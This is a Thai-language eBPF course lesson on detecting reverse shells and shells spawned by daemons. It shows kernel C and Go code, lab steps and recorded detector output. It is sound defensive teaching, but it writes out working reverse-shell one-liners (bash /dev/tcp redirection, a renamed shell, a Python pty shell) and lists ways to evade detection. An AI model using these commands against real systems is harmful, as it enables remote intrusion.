# สัปดาห์ที่ 15: ตรวจจับ Reverse Shell และ Shell ที่ถูก Spawn จาก Daemon ด้วย eBPF CO-RE

ยินดีต้อนรับสู่ **Week 15** ของหลักสูตร eBPF Zero to Hero!
เมื่อเซิร์ฟเวอร์ถูกเจาะผ่านช่องโหว่ประเภท **Remote Code Execution (RCE)** หรือ command injection ขั้นตอนถัดไปที่ผู้โจมตีมักทำคือเปิด **interactive shell** กลับมาหาตัวเอง (reverse shell) หรือสั่ง shell ผ่าน process ของ web service (`nginx`, `php-fpm`, `node`, `java`)

สัปดาห์นี้เราจะสร้าง **Threat Guard** ที่เกาะ tracepoint `sched/sched_process_exec` และใช้ **CO-RE** อ่านโครงสร้างภายในเคอร์เนล (`task_struct → real_parent`, `task_struct → files → fdtable → file → socket`) เพื่อตอบคำถาม 3 ข้อทุกครั้งที่มีการ `execve()`:
1. โปรแกรมที่ถูก exec คือ shell หรือ network tool หรือไม่ (**exact match** กับรายชื่อที่ปรับได้)
2. parent เป็น daemon ที่ "ไม่ควร" spawn shell หรือไม่
3. **stdin/stdout/stderr ของโปรเซสใหม่เป็น network socket หรือไม่** ซึ่งเป็นลักษณะเฉพาะของ reverse shell และไม่ขึ้นกับชื่อไฟล์

> ⚠️ **จริยธรรม:** การจำลอง reverse shell ในแล็บนี้เชื่อมต่อไปยัง listener บน `127.0.0.1` ที่เราเปิดเองเท่านั้น ให้ทดลองบนเครื่องหรือ VM ของตนเอง

---

## 1. ทฤษฎีเชิงลึก (Deep-Dive Theory)

### 1.1 Reverse shell ทำงานอย่างไร

```
 เครื่องเหยื่อ (ถูกเจาะ)                                     เครื่องผู้โจมตี
 ┌────────────────────────────────────────┐              ┌────────────────────┐
 │ web app ──(command injection)──► bash  │              │  listener :4444    │
 │   bash -c 'exec 3<>/dev/tcp/ATK/4444;  │   TCP        │  (nc -l / socat)   │
 │            exec sh <&3 >&3 2>&3'       │ ───────────► │                    │
 │                                        │              │  พิมพ์คำสั่ง ──────►│
 │   sh:  fd0 = socket ◄──────────────────┼──────────────┤                    │
 │        fd1 = socket ───────────────────┼─────────────►│  เห็นผลลัพธ์        │
 │        fd2 = socket                    │              └────────────────────┘
 └────────────────────────────────────────┘
```

หัวใจของ reverse shell คือ **การนำ socket มาเป็น stdin/stdout ของ shell** (ด้วย `dup2()` หรือ redirection) ดังนั้นการตรวจ "ชนิดของ fd 0/1/2" ณ จังหวะ `exec` จึงเป็นสัญญาณที่แข็งแรงกว่าการดูชื่อโปรแกรมมาก

### 1.2 จุดอ่อนของการตรวจด้วย `comm` (เวอร์ชันเดิม)

เวอร์ชันเดิมของแล็บเทียบ **prefix** ของ `comm` (ชื่อโปรเซส 15 ตัวอักษร) เช่น `"nc"`, `"bash"`, `"pyth"` ซึ่งมีปัญหาทั้งสองด้าน:

| ปัญหา | ตัวอย่าง |
|---|---|
| **False negative (หลบได้)** | `cp /bin/bash /tmp/x` แล้วรัน `/tmp/x` → `comm = "x"` ไม่ตรงรายชื่อใดเลย |
| | สคริปต์ `#!/bin/sh` ชื่อ `deploy.sh` → `comm = "deploy.sh"` (ทดสอบจริงบนเครื่องนี้) ไม่ใช่ `sh` |
| | `prctl(PR_SET_NAME)` / `exec -a` เปลี่ยนชื่อโปรเซสได้อิสระ |
| **False positive (เตือนผิด)** | prefix `"nc"` ตรงกับ `ncdu` (โปรแกรมดูขนาดดิสก์), prefix `"node"` ตรงกับ `node_exporter` |
| | prefix `"pyth"` เป็น parent: ทุกสคริปต์ Python ที่เรียก `subprocess`/`os.system` ถูกจัดเป็น `CRITICAL-RCE` |

เวอร์ชันนี้จึง:
- เปลี่ยนเป็น **exact match** ผ่าน BPF Hash Map ที่ key เป็น `char[16]` (เติม `\0`) และเติมรายชื่อจาก User Space ผ่าน flag `-shells`, `-nettools`, `-daemons`
- เพิ่ม **path เต็มของไฟล์ที่ถูก exec** (`EXEC FILENAME`) จาก `__data_loc_filename` ของ tracepoint ซึ่งเห็น `/tmp/x` แม้ `comm` จะเป็น `x`
- เพิ่ม **สัญญาณ socket stdio** ที่ไม่ขึ้นกับชื่อ

### 1.3 เดินพอยน์เตอร์ในเคอร์เนลด้วย CO-RE: fd → socket family

```
 struct task_struct *task = bpf_get_current_task()
        │ ->files
        ▼
 struct files_struct ──->fdt──► struct fdtable { max_fds, struct file **fd }
                                                   │ fd[0], fd[1], fd[2]
                                                   ▼
                                     struct file { f_inode, private_data, ... }
                                       │ ->f_inode->i_mode        │ ->private_data
                                       ▼                          ▼
                              (i_mode & S_IFMT) == S_IFSOCK ?   struct socket ->sk
                                                                   ▼
                                                    sk->__sk_common.skc_family
                                                    == AF_INET (2) / AF_INET6 (10) ?
```

ทุกขั้นอ่านด้วย `BPF_CORE_READ()` ซึ่ง (1) ใช้ `bpf_probe_read_kernel` อย่างปลอดภัย และ (2) บันทึก CO-RE relocation ให้ offset ของ `files`, `fdt`, `f_inode`, `private_data` ฯลฯ ถูกแก้ให้ตรงกับเคอร์เนลปลายทาง ไม่ต้องประกาศ `struct task_struct___core` เองแบบเวอร์ชันเดิม (ซึ่งเสี่ยงหากชื่อ/ชนิดฟิลด์ไม่ตรง)

### 1.4 ทำไมต้องกรองเฉพาะ `AF_INET`/`AF_INET6`

ครั้งแรกที่ทดลองโดยนับ socket ทุกชนิด ตัวตรวจจับรายงาน `CRITICAL-REVSHELL` ให้ `bash` ที่ถูกสั่งรันโดยเครื่องมือพัฒนาบนเครื่อง (parent เป็นโปรแกรม Node.js) เพราะ **libuv/Node.js ใช้ `AF_UNIX` socketpair เป็น stdio ของ child process** ตามปกติ (systemd socket activation และ IPC อื่น ๆ ก็ใช้ unix socket เช่นกัน) เราจึงอ่าน `skc_family` และนับเฉพาะ network socket (IPv4/IPv6) เท่านั้น ซึ่งเป็นตัวอย่างจริงของการลด false positive ด้วยการเพิ่มบริบท

### 1.5 การจัดระดับความรุนแรง (Severity)

| Severity | เงื่อนไข (คำนวณใน `classify()` ฝั่ง Go) | ความหมาย |
|---|---|---|
| `CRITICAL-REVSHELL` | fd0 หรือ fd1 เป็น network socket **และ** comm เป็น shell/net tool | reverse shell แบบคลาสสิก |
| `HIGH-SOCKET-STDIO` | fd0 หรือ fd1 เป็น network socket (ชื่ออะไรก็ได้) | shell ที่เปลี่ยนชื่อ, คำสั่งที่รันภายใน reverse shell, หรือบริการแบบ inetd |
| `CRITICAL-RCE` | parent อยู่ใน `-daemons` **และ** comm เป็น shell/net tool | web shell / command injection |
| `WARN-NETTOOL` | exec `nc`/`socat`/`telnet` ฯลฯ | เครื่องมือที่มักใช้ทำ reverse shell |
| `INFO-SHELL` | shell ปกติ (แสดงเฉพาะเมื่อใส่ `-all`) | ใช้ดู baseline ของระบบ |

### 1.6 ตำแหน่งของ `sched_process_exec`

> [!NOTE]
> บน Linux 7.0.0-38 ของเครื่องทดลองพบว่า tracepoint `syscalls:sys_enter_execve` ทำงานเฉพาะบน CPU 0 (สาเหตุยังไม่ยืนยัน ดู Week 16 ข้อ 1.2.1) แล็บนี้ใช้ `sched:sched_process_exec` ซึ่งเราตรวจด้วย bpftrace แล้วว่าทำงานครบทั้ง 8 CPU (`taskset -c 0..7 true` ได้ 2 ครั้งต่อ CPU)

tracepoint นี้ถูกเรียกหลังจาก `execve()` โหลดไบนารีใหม่สำเร็จแล้ว (`exec_binprm()`) ณ จุดนี้ `comm` ถูกเปลี่ยนเป็นชื่อไฟล์ใหม่แล้ว ส่วนตาราง fd **สืบทอดมาจากก่อน exec** (ยกเว้น fd ที่ตั้ง `O_CLOEXEC`) เราจึงเห็น socket ที่ผู้โจมตี redirect ไว้ได้ทันที ข้อมูล `filename` ใน tracepoint คือ path ที่ใช้ exec จริง

---

## 2. อธิบายโค้ดทีละบรรทัด (Line-by-Line Code Breakdown)

### 2.1 ไฟล์ `revshell_detect.c`

```c
#include "vmlinux.h"
...
#define S_IFMT   00170000
#define S_IFSOCK 0140000
#define AF_INET  2
#define AF_INET6 10
```
- **บรรทัด 17-30:** ใช้ `vmlinux.h` อย่างเดียว (ห้ามผสม `<linux/*.h>`) ค่าคงที่จาก `<linux/stat.h>`/`<linux/socket.h>` เป็น `#define` ซึ่ง BTF ไม่มี จึงต้องประกาศเอง

```c
#define F_SHELL         (1 << 0)
...
#define F_STDERR_SOCK   (1 << 5)
```
- **บรรทัด 35-44:** ค่าในตาราง `watch_names` (`NAME_SHELL`/`NAME_NETTOOL`) และ bit flags ที่ส่งขึ้น User Space ต้องตรงกับค่าคงที่ใน `main.go`

```c
struct threat_alert {
    __u64 ts_ns; __u32 pid; __u32 ppid; __u32 uid;
    __u8 flags; __u8 pad[3];
    char comm[TASK_COMM_LEN]; char pcomm[TASK_COMM_LEN];
    char filename[MAX_FILENAME_LEN];
};
```
- **บรรทัด 49-59:** alert ขนาด 184 ไบต์ ไม่มี implicit padding

```c
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, char[TASK_COMM_LEN]); __type(value, __u8); } watch_names SEC(".maps");
```
- **บรรทัด 70-83:** สอง Hash Map ที่ key เป็น `char[16]` ทำให้เทียบชื่อแบบ exact match ได้ในการ lookup ครั้งเดียว และแก้รายชื่อได้ขณะรันด้วย `bpftool map update`

```c
static __always_inline int fd_is_inet_socket(struct task_struct *task, unsigned int fd)
{
    struct files_struct *files = BPF_CORE_READ(task, files);
    ...
    if (fd >= BPF_CORE_READ(fdt, max_fds)) {
        return 0;
    }
    struct file **fd_array = BPF_CORE_READ(fdt, fd);
    struct file *f = NULL;
    if (bpf_core_read(&f, sizeof(f), &fd_array[fd]) || !f) {
```
- **บรรทัด 91-108:** เดินจาก task ไปยัง `struct file` ของ fd ที่ต้องการ ตรวจ `max_fds` ก่อนเพื่อไม่อ่านเลยขอบ array และใช้ `bpf_core_read` อ่าน pointer ใน array

```c
    umode_t mode = BPF_CORE_READ(f, f_inode, i_mode);
    if ((mode & S_IFMT) != S_IFSOCK) {
        return 0;
    }
    struct socket *sock = (struct socket *)BPF_CORE_READ(f, private_data);
    ...
    __u16 family = BPF_CORE_READ(sock, sk, __sk_common.skc_family);
    return family == AF_INET || family == AF_INET6;
```
- **บรรทัด 109-119:** ตรวจว่าเป็น socket inode แล้วจึงตีความ `private_data` เป็น `struct socket *` (ถูกต้องเฉพาะ socket file เท่านั้น จึงต้องตรวจ `S_IFSOCK` ก่อน) และกรองเฉพาะ IPv4/IPv6

```c
SEC("tracepoint/sched/sched_process_exec")
int trace_exec_threat(struct trace_event_raw_sched_process_exec *ctx)
{
    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(&comm, sizeof(comm));
```
- **บรรทัด 122-126:** ใช้ `struct trace_event_raw_sched_process_exec` จาก `vmlinux.h` แทน struct ที่ประกาศเอง `comm` ถูก zero-init เพื่อให้ไบต์หลัง `\0` เป็นศูนย์ ตรงกับ key ใน map

```c
    __u8 *kind = bpf_map_lookup_elem(&watch_names, &comm);
    ...
    if (fd_is_inet_socket(task, 0)) flags |= F_STDIN_SOCK;
    ...
    if (flags == 0) {
        return 0;
    }
```
- **บรรทัด 131-142:** คำนวณ flags แล้วจบทันทีหากไม่น่าสนใจ ทำให้ exec ส่วนใหญ่ของระบบเสียค่าใช้จ่ายเพียง map lookup 1 ครั้งและการอ่าน fd 3 ตัว

```c
    struct task_struct *parent = BPF_CORE_READ(task, real_parent);
    ...
    if (bpf_map_lookup_elem(&daemon_names, &pcomm)) {
        flags |= F_DAEMON_PARENT;
    }
```
- **บรรทัด 144-153:** อ่าน `real_parent->comm` และ `tgid` ด้วย CO-RE แล้วเทียบกับรายชื่อ daemon แบบ exact match

```c
    unsigned int off = ctx->__data_loc_filename & 0xFFFF;
    bpf_probe_read_kernel_str(alert->filename, sizeof(alert->filename), (void *)ctx + off);
```
- **บรรทัด 173-174:** ฟิลด์ `__data_loc` เก็บ offset (16 บิตล่าง) และความยาว (16 บิตบน) ของข้อมูลความยาวแปรผันที่ต่อท้าย record ของ tracepoint เราจึงคำนวณ address แล้วอ่านสตริง path

### 2.2 ไฟล์ `main.go`

```go
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags "-I../../" bpf revshell_detect.c
```
- **บรรทัด 6:** ชี้ `-I../../` ไปยัง `vmlinux.h` ที่รากของ repo

```go
func commKey(name string) ([16]byte, error) {
	var k [16]byte
	if len(name) == 0 || len(name) > 15 {
```
- **บรรทัด 68-75:** แปลงชื่อเป็น key 16 ไบต์ ชื่อยาวเกิน 15 ตัวอักษรถูกปฏิเสธ เพราะเคอร์เนลตัด `comm` ที่ 15 ตัวอักษรเสมอ (exact match จะไม่มีวันตรง)

```go
	log.Printf("[CONFIG] shells   : %s\n", strings.Join(fillNames(objs.WatchNames, *shells, nameShell), ","))
	log.Printf("[CONFIG] daemons  : %s\n", strings.Join(fillNames(objs.DaemonNames, *daemons, 1), ","))
```
- **บรรทัด 147-149:** เติมรายชื่อลง map ก่อน attach tracepoint (บรรทัด 151) เพื่อไม่ให้มีช่วงเวลาที่ map ยังว่าง

```go
func classify(f uint8) (string, string) {
	stdioSock := f&(fStdinSock|fStdoutSock) != 0
	switch {
	case stdioSock && f&(fShell|fNetTool) != 0:
		return colorRed, "CRITICAL-REVSHELL"
```
- **บรรทัด 97-110:** กฎตัดสิน severity (ตารางในข้อ 1.5) อยู่ใน User Space จึงปรับนโยบายได้โดยไม่ต้องโหลดโปรแกรม eBPF ใหม่

```go
		if severity == "INFO-SHELL" && !*showAll {
			continue
		}
```
- **บรรทัด 194-196:** ซ่อน shell ปกติเว้นแต่ใส่ `-all`

---

## 3. ขั้นตอนการรันและทดสอบ (Step-by-Step Execution & Verification)

### ขั้นตอนที่ 1: คอมไพล์
```bash
cd phase07-advanced-security-observability/week15-reverse-shell-guard
make all
```

### ขั้นตอนที่ 2: เปิด "listener ของผู้โจมตี" บน loopback (Terminal 1)
สร้าง `listener.py` ที่รับการเชื่อมต่อ 3 ครั้ง ส่งคำสั่งทดสอบที่ไม่อันตราย แล้วปิดเอง:
```python
import socket
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 4444)); srv.listen(1); srv.settimeout(20)   # 127.0.0.1 เท่านั้น
for i in range(3):
    c, a = srv.accept(); c.settimeout(3)
    c.sendall(b"echo shell-uid=$(id -u) comm=$(cat /proc/$$/comm); exit\n")
    out = b""
    try:
        while (d := c.recv(4096)): out += d
    except socket.timeout: pass
    print(f"[listener] conn {i+1} from {a[0]}:{a[1]} -> {out.decode(errors='replace').strip()!r}")
    c.close()
```
```bash
python3 listener.py
```

### ขั้นตอนที่ 3: รัน Threat Guard (Terminal 2)
```bash
sudo ./bin/threat-guard -all
```

### ขั้นตอนที่ 4: จำลองเหตุการณ์ (Terminal 3)
```bash
# (a) shell ปกติ -> INFO-SHELL
bash -c "echo benign"

# (b) reverse shell แบบคลาสสิก -> CRITICAL-REVSHELL
bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec sh <&3 >&3 2>&3'

# (c) shell ที่เปลี่ยนชื่อ (ตัวตรวจจับเดิมมองไม่เห็น) -> HIGH-SOCKET-STDIO
cp /bin/sh ./x && bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec ./x <&3 >&3 2>&3'; rm -f ./x

# (d) reverse shell ผ่าน pty (หลบสัญญาณ socket stdio) -> เห็นเป็นเพียง INFO-SHELL
python3 -c 'import socket,os,pty; s=socket.create_connection(("127.0.0.1",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/sh")'
```

### ขั้นตอนที่ 5: จำลอง shell ที่ถูก spawn จาก daemon (CRITICAL-RCE)
หยุด Terminal 2 แล้วรันใหม่โดยเพิ่ม `python3` เข้าไปในรายชื่อ daemon **เพื่อการทดลองเท่านั้น** (ในระบบจริงไม่ควรใส่ `python3` เพราะจะเตือนผิดบ่อย):
```bash
sudo ./bin/threat-guard -daemons nginx,apache2,httpd,php-fpm,node,python3
# Terminal 3: จำลอง web app ที่ถูก command injection แล้วเรียก os.system()
python3 -c 'import os; os.system("id -un")'
```

### ขั้นตอนที่ 6: ตรวจสอบและล้างสภาพแวดล้อม
```bash
sudo bpftool map dump name watch_names | head     # ดูรายชื่อที่เติมไว้ (ขณะโปรแกรมยังรัน)
pgrep -af "listener.py|threat-guard" || echo "clean"   # หลังจบต้องไม่มีโปรเซสค้าง
```

---

## 4. ผลลัพธ์จากการทดลองจริง (Actual Lab Execution Output)

> **Environment**: Ubuntu 26.04 LTS (`Linux 7.0.0-38-generic x86_64`), clang 21, Go 1.26, cilium/ebpf v0.16.0 (บันทึกเมื่อ 2026-10-28)
> ตัด ANSI color code ออกเพื่อให้อ่านง่าย ระหว่างบันทึกมีเครื่องมืออื่นบนเครื่อง (agent ที่รัน `bash`, `gmake` ของแล็บอื่น) จึงมี `INFO-SHELL` พื้นหลังปนอยู่ ตอนบันทึกไฟล์ `x` อยู่ในไดเรกทอรี scratch ชั่วคราว

### 4.1 Terminal 3 และ listener
```text
$ bash -c "echo benign"
benign
$ bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec sh <&3 >&3 2>&3'
$ cp /bin/sh ./x && bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec ./x <&3 >&3 2>&3'
$ python3 -c 'import socket,os,pty; s=socket.create_connection(("127.0.0.1",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/sh")'
pty rc=0
[listener] conn 1 from 127.0.0.1:39622 -> 'shell-uid=1000 comm=sh'
[listener] conn 2 from 127.0.0.1:39630 -> 'shell-uid=1000 comm=x'
[listener] conn 3 from 127.0.0.1:39640 -> 'echo shell-uid=$(id -u) comm=$(cat /proc/$$/comm); exit\r\n$ shell-uid=1000 comm=sh'
```
ทั้ง 3 กรณีได้ shell จริง (listener เห็น uid และ comm ของ shell) กรณี pty มี echo ของคำสั่งและ prompt `$` กลับมาด้วย ซึ่งเป็นลักษณะของ terminal จริง

### 4.2 Threat Guard (`sudo ./bin/threat-guard -all`)
```text
======================================================================
 eBPF Reverse Shell & Interactive Threat Detector (CO-RE + RingBuffer)
======================================================================
2026/10/28 22:05:24 [CONFIG] shells   : sh,bash,dash,zsh,ksh,mksh,fish,csh,tcsh
2026/10/28 22:05:24 [CONFIG] nettools : nc,ncat,netcat,nc.openbsd,nc.traditional,socat,telnet
2026/10/28 22:05:24 [CONFIG] daemons  : nginx,apache2,httpd,php-fpm,node,java,redis-server,mysqld,postgres
2026/10/28 22:05:24 [INFO] Hooked tracepoint 'sched/sched_process_exec'.
2026/10/28 22:05:24 [INFO] Watching for shells with socket stdio and daemon-spawned shells...

TIME      SEVERITY           PID      PPID     STDIO PROCESS    PARENT       EXEC FILENAME
----------------------------------------------------------------------------------------------
22:05:25  INFO-SHELL         4088174  1896066  ---   bash       2.1.312      /bin/bash
22:05:25  INFO-SHELL         4088176  4088175  ---   bash       timeout      /usr/bin/bash
22:05:26  INFO-SHELL         4088267  4087856  ---   bash       bash         /usr/bin/bash
22:05:26  INFO-SHELL         4088268  4087856  ---   bash       bash         /usr/bin/bash
22:05:26  CRITICAL-REVSHELL  4088268  4087856  012   sh         bash         /usr/bin/sh
22:05:26  HIGH-SOCKET-STDIO  4088269  4088268  0-2   id         sh           /usr/bin/id
22:05:26  HIGH-SOCKET-STDIO  4088270  4088268  0-2   cat        sh           /usr/bin/cat
22:05:26  INFO-SHELL         4088368  4087856  ---   bash       bash         /usr/bin/bash
22:05:26  HIGH-SOCKET-STDIO  4088368  4087856  012   x          bash         /tmp/claude-1000/-mnt-sda-ebpf/de1b96f4-c4a2-426e-af44-a6e9641250a9/scratchpad/x
22:05:26  HIGH-SOCKET-STDIO  4088373  4088368  0-2   id         x            /usr/bin/id
22:05:26  HIGH-SOCKET-STDIO  4088374  4088368  0-2   cat        x            /usr/bin/cat
22:05:27  INFO-SHELL         4088470  4088469  ---   sh         python3      /bin/sh
22:05:27  INFO-SHELL         4088532  4086977  ---   sh         gmake        /bin/sh
22:05:27  INFO-SHELL         4088554  4086971  ---   sh         gmake        /bin/sh
22:05:27  INFO-SHELL         4088557  4088556  ---   sh         gmake        /bin/sh
22:05:27  INFO-SHELL         4088560  4088559  ---   sh         gmake        /bin/sh
22:05:28  INFO-SHELL         4088836  3760745  ---   bash       claude       /bin/bash
22:05:28  INFO-SHELL         4088862  3760745  ---   bash       claude       /bin/bash
22:05:31  INFO-SHELL         4089351  3760745  ---   bash       claude       /bin/bash
22:05:32  INFO-SHELL         4089699  3760745  ---   bash       claude       /bin/bash

[INFO] Stopping Threat Guard...
[SUCCESS] Threat Guard cleanly shutdown.
```

### 4.3 Daemon-spawned shell (`-daemons nginx,apache2,httpd,php-fpm,node,python3`)
```text
$ python3 -c 'import os; os.system("id -un")'   # จำลอง web app ที่ถูก command injection
ce
...
TIME      SEVERITY           PID      PPID     STDIO PROCESS    PARENT       EXEC FILENAME
----------------------------------------------------------------------------------------------
22:05:47  CRITICAL-RCE       4093171  4093168  ---   sh         python3      /bin/sh

[INFO] Stopping Threat Guard...
[SUCCESS] Threat Guard cleanly shutdown.
```

**วิเคราะห์ผล:**
- **(b) reverse shell คลาสสิก:** PID 4088268 เริ่มจาก `bash` (INFO) แล้ว `exec sh` ด้วย fd 0/1/2 เป็น socket (`STDIO = 012`) จึงเป็น `CRITICAL-REVSHELL` คำสั่ง `id`, `cat` ที่ผู้โจมตีสั่งผ่าน shell ก็ถูกรายงานด้วย (`0-2`: stdout เป็น pipe เพราะอยู่ใน `$(...)`) กลายเป็น **บันทึกคำสั่งของผู้โจมตี** โดยอัตโนมัติ
- **(c) shell เปลี่ยนชื่อ:** `comm = x` ไม่ตรงรายชื่อ shell แต่ยังถูกจับเป็น `HIGH-SOCKET-STDIO` และเห็น path เต็มของไฟล์ ตัวตรวจจับเวอร์ชันเดิม (prefix ของ comm) **ไม่แจ้งเตือนเลย** ในกรณีนี้
- **(d) pty reverse shell:** `sh` (PID 4088470, parent `python3`) มี stdio เป็น pty ไม่ใช่ socket จึงเห็นเป็นเพียง `INFO-SHELL` ทั้งที่ listener ได้ shell จริง นี่คือ **การหลบหลีกที่สำเร็จ** (ดูข้อ 5)
- **CRITICAL-RCE:** เมื่อ `python3` อยู่ในรายชื่อ daemon, `os.system()` ซึ่งเรียก `/bin/sh -c` ทำให้เกิด alert ทันที
- `bash` จากเครื่องมือพัฒนา (parent `claude`, `2.1.312`) แสดง `STDIO = ---` เพราะ stdio เป็น unix socket ซึ่งถูกกรองออกตามข้อ 1.4

---

## 5. ข้อจำกัดและ Threat Model (Limitations)

**สมมติฐาน (Threat Model):** ผู้โจมตีได้ code execution ในสิทธิ์ของบริการ (ไม่ใช่ root) และพยายามเปิด interactive shell ตัวตรวจจับนี้เป็น **detection (แจ้งเตือน)** ไม่ได้บล็อก ผู้ที่มีสิทธิ์ root/`CAP_SYS_ADMIN`/`CAP_BPF` สามารถ kill agent หรือ detach โปรแกรมได้ (ดู Week 16)

| วิธีหลบเลี่ยง / ข้อจำกัด | ผลต่อตัวตรวจจับนี้ | ทดสอบแล้ว |
|---|---|---|
| **pty-based shell** (`pty.spawn`, `script`, `socat ... pty`) | stdio ของ shell เป็น pty ไม่ใช่ socket → เห็นเป็น INFO-SHELL เท่านั้น | ✔ หลบได้ |
| **ไม่ exec เลย**: reverse shell ในตัว interpreter (Python/Perl/PHP วน `recv` → `subprocess` ทีละคำสั่ง) | ไม่มี shell ที่มี socket stdio; เห็นเพียงคำสั่งย่อยที่ stdio เป็น pipe | ไม่ได้ทดสอบ |
| ใช้ relay ผ่าน pipe/FIFO (`mkfifo` + `nc`) | shell ได้ stdio เป็น pipe; มีเพียง `nc` ที่เป็น `WARN-NETTOOL` | ไม่ได้ทดสอบ |
| socket ชนิดอื่น (unix socket ข้ามไปยัง proxy, `AF_VSOCK`) | ไม่นับเป็น network socket โดยการออกแบบ | ไม่ได้ทดสอบ |
| เปลี่ยนชื่อ binary / สคริปต์ shebang / `prctl(PR_SET_NAME)` | หลบรายชื่อ shell ได้ แต่ยังโดนสัญญาณ socket stdio | ✔ (กรณี `x`) |
| เปลี่ยนชื่อ parent | `CRITICAL-RCE` อาศัย `comm` ของ parent ซึ่งปลอมได้ง่าย และ worker อย่าง `php-fpm8.3` จะไม่ตรง exact match `php-fpm` | ไม่ได้ทดสอบ |
| False positive | บริการแบบ inetd/`systemd` socket activation (`Accept=yes`) ที่ส่ง TCP socket เป็น stdio ของโปรแกรมจะได้ `HIGH-SOCKET-STDIO` | ไม่ได้ทดสอบ |
| TOCTOU / race | ตรวจ ณ จังหวะ exec เท่านั้น ถ้า `dup2()` socket หลัง exec (เช่นใน interpreter) จะไม่เห็น | — |
| ring buffer เต็ม | alert หายระหว่าง exec storm | — |

**แนวทางเสริมความแข็งแรง:** ตรวจ hash/inode ของ executable (`task->mm->exe_file`) เทียบกับ `/bin/*sh` (จับ shell ที่ถูก copy), ติดตาม `dup2`/`dup3` ที่นำ socket ไปเป็น fd 0-2 (`tracepoint/syscalls/sys_enter_dup*`), ตรวจการเปิด `/dev/ptmx` ร่วมกับ socket ในโปรเซสเดียวกัน, และใช้ **BPF LSM** (`lsm/bprm_check_security`) หากต้องการ **บล็อก** แทนการแจ้งเตือน

---

## 6. Milestone Checklist

- [x] อธิบายกลไกของ reverse shell และเหตุผลที่ "socket เป็น stdio" เป็นสัญญาณที่แข็งแรงกว่าชื่อโปรเซส
- [x] ใช้ `vmlinux.h` + `struct trace_event_raw_sched_process_exec` แทน struct ที่ประกาศเอง
- [x] เดินพอยน์เตอร์ `task → files → fdtable → file → socket → sk` ด้วย `BPF_CORE_READ` อย่างปลอดภัย (ตรวจ `max_fds`, `S_IFSOCK`)
- [x] อ่านข้อมูลความยาวแปรผันจาก tracepoint ผ่าน `__data_loc`
- [x] ใช้ Hash Map ที่ key เป็น `char[16]` สำหรับ exact match ที่ปรับรายชื่อได้ขณะรัน
- [x] ลด false positive จาก unix socketpair ด้วยการตรวจ `skc_family`
- [x] ทดสอบทั้งกรณีที่จับได้และกรณีที่หลบได้ (pty) อย่างตรงไปตรงมา

---

## 7. แบบฝึกหัดท้ายบท (Exercises)

### ระดับพื้นฐาน
1. **ปรับรายชื่อขณะรัน:** ขณะ `threat-guard` ทำงาน ใช้ `bpftool map update name daemon_names key ... value 1` เพิ่มชื่อ `python3` (key เป็น 16 ไบต์ hex) โดยไม่ต้องรีสตาร์ทโปรแกรม
   - *ส่งงาน:* คำสั่ง `bpftool` ที่ใช้ + alert `CRITICAL-RCE` จาก `python3 -c 'import os; os.system("true")'`
   - *ตรวจ:* `bpftool map dump name daemon_names` ต้องมี key ใหม่
2. **วัด noise ของระบบ:** รัน `sudo ./bin/threat-guard -all` 5 นาทีบนเครื่องของตนเองขณะใช้งานปกติ แล้วนับจำนวน alert แยกตาม severity
   - *ส่งงาน:* ตารางจำนวน alert + parent ที่พบบ่อยที่สุด 3 อันดับ
   - *ตรวจ:* ต้องไม่มี `CRITICAL-*` ในการใช้งานปกติ หากมี ให้อธิบายสาเหตุ (false positive)

### ระดับปานกลาง
1. **ตรวจ executable จริง:** อ่าน `task->mm->exe_file->f_inode->i_ino` และ `i_sb->s_dev` ส่งขึ้น User Space แล้วให้ Go เทียบกับ inode ของ `/bin/bash`, `/bin/dash` (`os.Stat`) เพื่อติดป้าย `RENAMED-SHELL` เมื่อ inode ตรงแต่ `comm` ไม่ตรง
   - *ส่งงาน:* โค้ด + ผลการรันกรณี `ln /bin/dash /tmp/y` (hard link ชื่ออื่น)
   - *ตรวจ:* อธิบายว่าทำไม `cp` (สำเนา) จึงจับไม่ได้ด้วยวิธีนี้ และควรใช้ hash ของไฟล์ (เช่น IMA) แทน
2. **จับ dup2 ไปยัง stdio:** เพิ่มโปรแกรมที่แจ้งเตือนเมื่อ `newfd` เป็น 0/1/2 และ `oldfd` เป็น network socket (แนะนำ `tracepoint/raw_syscalls/sys_enter` กรองหมายเลข `dup2`/`dup3` หรือ `fentry` ที่ฟังก์ชันภายในของ dup แทน `syscalls/sys_enter_dup3` เพราะบน Linux 7.0.0-38 พบว่า `syscalls:sys_enter_*` บางตัวไม่ทำงานทุก CPU; ทดสอบด้วย `taskset -c N` ทุก CPU)
   - *ส่งงาน:* โค้ด + ผลการรันกรณี (d) pty reverse shell ที่ตอนนี้ถูกจับได้ที่ขั้น `os.dup2`
   - *ตรวจ:* การใช้งานปกติอย่าง `bash -c "echo hi > /tmp/f"` ต้องไม่ถูกแจ้งเตือน

### ระดับท้าทาย
1. **จาก detect สู่ prevent ด้วย BPF LSM:** บนเครื่องที่เปิด BPF LSM (`lsm=...,bpf` ใน kernel cmdline; ตรวจด้วย `cat /sys/kernel/security/lsm`) เขียน `SEC("lsm/bprm_check_security")` ที่ปฏิเสธ (`-EPERM`) การ exec shell เมื่อ fd 0 เป็น network socket
   - *ส่งงาน:* โค้ด + ผลการทดสอบกรณี (b) ที่ `exec sh` ล้มเหลว
   - *ตรวจ:* ทดลองใน VM เท่านั้น และแสดงว่า shell ปกติยังใช้งานได้
2. **Process lineage:** เก็บ ancestry ย้อนขึ้นไป 4 ระดับ (`real_parent` ซ้อนกันด้วย loop ที่มีขอบเขต) แล้วตรวจว่า shell มีบรรพบุรุษเป็น daemon หรือไม่ แม้จะคั่นด้วย `sh -c` หลายชั้น
   - *ส่งงาน:* โค้ด + ผลการรันกรณี `python3 -c 'import os; os.system("sh -c \"sh -c id\"")'`
   - *ตรวจ:* โปรแกรมต้องผ่าน verifier และแสดง lineage ครบทุกระดับ
